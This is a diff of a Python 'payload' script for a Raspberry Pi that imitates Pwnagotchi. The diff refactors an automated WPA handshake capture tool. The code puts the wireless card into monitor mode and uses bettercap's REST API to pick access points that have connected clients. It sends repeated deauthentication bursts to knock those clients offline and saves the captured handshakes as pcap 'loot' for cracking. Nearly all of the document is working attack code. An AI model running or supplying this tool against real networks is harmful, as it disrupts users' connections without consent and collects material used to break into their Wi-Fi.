@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
 """
-KTOx Payload – Pwnagotchi (KTOx Edition)
-==========================================
+KTOx Payload – Pwnagotchi (Working)
+====================================
 Author: wickednull
 
-Automated WPA handshake sniffer with a Tamagotchi-style face.
-- Bettercap REST API
+- Bettercap REST API handshake sniffer
+- Tamagotchi face on LCD
 - Auto-targets APs with clients
-- Sends deauth bursts to capture handshakes
-- Saves handshakes to loot directory
+- Saves handshakes to /root/KTOx/loot/Handshakes/
 
 Controls:
   KEY3 – exit
@@ -17,7 +16,6 @@ Controls:
 import os
 import sys
 import time
-import socket
 import threading
 import json
 import requests
@@ -26,7 +24,7 @@ import random
 from datetime import datetime
 
 # ----------------------------------------------------------------------
-# Hardware & LCD
+# Hardware & LCD (exact pattern from Auto Crack)
 # ----------------------------------------------------------------------
 try:
     import RPi.GPIO as GPIO
@@ -58,7 +56,6 @@ def font(size=9):
 
 f9 = font(9)
 f11 = font(11)
-f16 = font(16)
 
 # ----------------------------------------------------------------------
 # Bettercap REST API
@@ -75,9 +72,7 @@ mood = "normal"
 console_msg = "Starting..."
 bettercap_proc = None
 running = True
-interface = None
 
-# Faces (same as original)
 faces = {
     "normal":   "(◕‿‿◕)",
     "happy":    "(◕‿‿◕)",
@@ -98,7 +93,7 @@ def set_mood(new_mood):
         threading.Timer(4.0, lambda: set_mood("normal") if mood == new_mood else None).start()
 
 # ----------------------------------------------------------------------
-# Monitor mode helpers
+# Monitor mode (same as Auto Crack)
 # ----------------------------------------------------------------------
 def enable_monitor_mode(iface="wlan0"):
     subprocess.run("airmon-ng check kill", shell=True)
@@ -152,16 +147,14 @@ def get_wifi_data():
         pass
     return None
 
-def associate_with_ap(bssid, throttle=5):
-    """Associate with an AP (bettercap will follow it)."""
+def associate_with_ap(bssid):
     try:
-        r = requests.post(f"{API_URL}/wifi/ap/{bssid}", timeout=throttle+1)
+        r = requests.post(f"{API_URL}/wifi/ap/{bssid}", timeout=5)
         return r.status_code == 200
     except:
         return False
 
-def deauth_client(bssid, client_mac, count=5):
-    """Send deauth packets to a specific client of an AP."""
+def deauth_client(bssid, client_mac, count=10):
     try:
         payload = {"bssid": bssid, "client": client_mac, "count": count}
         r = requests.post(f"{API_URL}/wifi/deauth", json=payload, timeout=2)
@@ -170,7 +163,6 @@ def deauth_client(bssid, client_mac, count=5):
         return False
 
 def has_handshake(bssid):
-    """Check if a handshake has been captured for this BSSID."""
     try:
         r = requests.get(f"{API_URL}/wifi/handshakes", timeout=2)
         if r.status_code == 200:
@@ -182,9 +174,6 @@ def has_handshake(bssid):
         pass
     return False
 
-# ----------------------------------------------------------------------
-# Handshake saving
-# ----------------------------------------------------------------------
 def save_handshake(bssid, essid):
     global handshake_count
     handshake_count += 1
@@ -192,130 +181,66 @@ def save_handshake(bssid, essid):
     os.makedirs(loot_dir, exist_ok=True)
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
-    # bettercap saves handshakes in its own pcap; we'll copy it if possible
     src_pcap = "/root/bettercap-wifi-handshakes.pcap"
     if os.path.exists(src_pcap):
         dest = os.path.join(loot_dir, f"{safe_essid}_{bssid}_{ts}.pcap")
         subprocess.run(f"cp {src_pcap} {dest}", shell=True)
         with open(os.path.join(loot_dir, "handshake_log.txt"), "a") as log:
             log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
-    console_msg = f"Handshake! Total: {handshake_count}"
     set_mood("happy")
+    global console_msg
+    console_msg = f"Handshake! Total: {handshake_count}"
 
 # ----------------------------------------------------------------------
-# Main attack loop (runs in background thread)
-# ----------------------------------------------------------------------
-attack_running = True
-
-def attack_loop():
-    global attack_running, console_msg, ap_count, client_count
-    while attack_running and running:
-        data = get_wifi_data()
-        if not data:
-            time.sleep(2)
-            continue
-
-        aps = data.get("aps", [])
-        ap_count = len(aps)
-        total_clients = 0
-        for ap in aps:
-            total_clients += len(ap.get("clients", []))
-        client_count = total_clients
-
-        # Find a suitable target (AP with clients, not already handshaked)
-        target = None
-        for ap in aps:
-            bssid = ap.get("bssid")
-            essid = ap.get("essid", "")
-            clients = ap.get("clients", [])
-            if clients and not has_handshake(bssid):
-                target = (bssid, essid, clients)
-                break
-
-        if not target:
-            console_msg = f"Scanning... {ap_count} APs"
-            time.sleep(3)
-            continue
-
-        bssid, essid, clients = target
-        console_msg = f"Target: {essid[:12]}"
-        set_mood("assoc")
-        # Associate with the AP
-        associate_with_ap(bssid, throttle=3)
-        time.sleep(1)
-
-        # Choose a random client
-        target_client = random.choice(clients) if clients else None
-        if not target_client:
-            continue
-
-        client_mac = target_client.get("mac", "")
-        console_msg = f"Deauth: {client_mac[-6:]}"
-        set_mood("attacking")
-
-        # Send deauth bursts
-        for _ in range(3):
-            deauth_client(bssid, client_mac, count=10)
-            time.sleep(0.5)
-
-        # Wait for handshake
-        for _ in range(10):
-            if has_handshake(bssid):
-                save_handshake(bssid, essid)
-                break
-            time.sleep(1)
-
-        set_mood("normal")
-        time.sleep(2)  # cooldown
-
-# ----------------------------------------------------------------------
-# LCD drawing (main thread)
+# LCD drawing (same as Auto Crack)
 # ----------------------------------------------------------------------
 def draw_screen():
     img = Image.new("RGB", (W, H), "#0A0000")
     d = ImageDraw.Draw(img)
-
-    # Header
     d.rectangle((0, 0, W, 17), fill="#8B0000")
     d.text((4, 3), "PWNAGOTCHI", font=f9, fill="#FF3333")
-
-    # Stats (left column)
     y = 20
     d.text((4, y), f"HS: {handshake_count}", font=f9, fill="#FFBBBB"); y += 12
     d.text((4, y), f"APs: {ap_count}", font=f9, fill="#FFBBBB"); y += 12
     d.text((4, y), f"CLI: {client_count}", font=f9, fill="#FFBBBB"); y += 12
-
-    # Face (centered)
     face_char = faces.get(mood, faces["normal"])
-    # Use a larger font
     try:
         face_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
     except:
-        face_font = f16
+        face_font = f11
     bbox = d.textbbox((0, 0), face_char, font=face_font)
     face_w = bbox[2] - bbox[0]
     face_x = (W - face_w) // 2
     d.text((face_x, 50), face_char, font=face_font, fill="#00FF00")
-
-    # Console message (bottom)
     d.text((4, H-30), console_msg[:23], font=f9, fill="#AAAAAA")
-
-    # Footer
     d.rectangle((0, H-12, W, H), fill="#220000")
     d.text((4, H-10), "K3=Exit", font=f9, fill="#FF7777")
-
     LCD.LCD_ShowImage(img, 0, 0)
 
+def wait_btn(timeout=0.1):
+    start = time.time()
+    while time.time() - start < timeout:
+        for name, pin in PINS.items():
+            if GPIO.input(pin) == 0:
+                time.sleep(0.05)
+                return name
+        time.sleep(0.02)
+    return None
+
 # ----------------------------------------------------------------------
-# Main
+# Main (attack logic in main loop, no separate thread)
 # ----------------------------------------------------------------------
 def main():
-    global running, attack_running, interface
+    global running, ap_count, client_count, console_msg
 
-    # Find wireless interface
+    # Show starting message
+    draw_screen()
+    time.sleep(0.5)
+
+    # Enable monitor mode
     iface = "wlan0"
-    interface = enable_monitor_mode(iface)
-    if not interface:
+    mon = enable_monitor_mode(iface)
+    if not mon:
         draw_screen()
         img = Image.new("RGB", (W, H), "black")
         d = ImageDraw.Draw(img)
@@ -327,7 +252,7 @@ def main():
         return
 
     # Start bettercap
-    if not start_bettercap(interface):
+    if not start_bettercap(mon):
         draw_screen()
         img = Image.new("RGB", (W, H), "black")
         d = ImageDraw.Draw(img)
@@ -341,29 +266,79 @@ def main():
 
     console_msg = "Bettercap ready"
     set_mood("normal")
+    draw_screen()
 
-    # Start attack thread
-    attack_thread = threading.Thread(target=attack_loop, daemon=True)
-    attack_thread.start()
-
-    # Main LCD/button loop
+    # Main loop (attack logic inside, not separate thread)
+    last_attack = 0
     held = {}
+
     while running:
-        draw_screen()
+        now = time.time()
+        # Update stats every 2 seconds
+        data = get_wifi_data()
+        if data:
+            aps = data.get("aps", [])
+            ap_count = len(aps)
+            total_clients = 0
+            for ap in aps:
+                total_clients += len(ap.get("clients", []))
+            client_count = total_clients
+
+        # Attack logic (run every 10 seconds)
+        if now - last_attack > 10:
+            last_attack = now
+            # Find a target
+            data = get_wifi_data()
+            if data:
+                aps = data.get("aps", [])
+                target = None
+                for ap in aps:
+                    bssid = ap.get("bssid")
+                    essid = ap.get("essid", "")
+                    clients = ap.get("clients", [])
+                    if clients and not has_handshake(bssid):
+                        target = (bssid, essid, clients)
+                        break
+                if target:
+                    bssid, essid, clients = target
+                    console_msg = f"Target: {essid[:12]}"
+                    set_mood("assoc")
+                    draw_screen()
+                    associate_with_ap(bssid)
+                    time.sleep(1)
+                    target_client = random.choice(clients)
+                    client_mac = target_client.get("mac", "")
+                    console_msg = f"Deauth: {client_mac[-6:]}"
+                    set_mood("attacking")
+                    draw_screen()
+                    for _ in range(3):
+                        deauth_client(bssid, client_mac, count=10)
+                        time.sleep(0.5)
+                    for _ in range(10):
+                        if has_handshake(bssid):
+                            save_handshake(bssid, essid)
+                            break
+                        time.sleep(1)
+                    set_mood("normal")
+                    draw_screen()
+                else:
+                    console_msg = f"Scanning... {ap_count} APs"
+                    draw_screen()
+
+        # Button handling
         pressed = {n: GPIO.input(p)==0 for n,p in PINS.items()}
         for n, down in pressed.items():
             if down:
-                if n not in held: held[n] = time.time()
+                if n not in held: held[n] = now
             else:
                 held.pop(n, None)
-
-        if pressed.get("KEY3") and (time.time() - held.get("KEY3", 0)) <= 0.05:
+        if pressed.get("KEY3") and (now - held.get("KEY3", now)) <= 0.05:
             break
 
+        draw_screen()
         time.sleep(0.1)
 
     # Cleanup
-    attack_running = False
     stop_bettercap()
     disable_monitor_mode(iface)
     LCD.LCD_Clear()
